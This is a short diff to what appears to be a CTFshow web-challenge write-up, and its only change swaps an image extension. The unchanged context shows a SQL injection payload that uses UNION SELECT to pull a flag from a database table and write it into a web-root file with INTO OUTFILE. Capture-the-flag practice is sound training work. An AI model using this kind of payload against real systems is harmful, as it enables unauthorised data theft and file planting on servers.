@@ -220,7 +220,7 @@ if __name__ == "__main__":
 ?id=-1')) union select 1,2,(select flag43 from ctfshow.flagdk) into outfile '/var/www/html/1.txt'-- -
 ```
 
-![img](./assets/001.png)
+![img](./assets/001.webp)
 
 ## web524
 
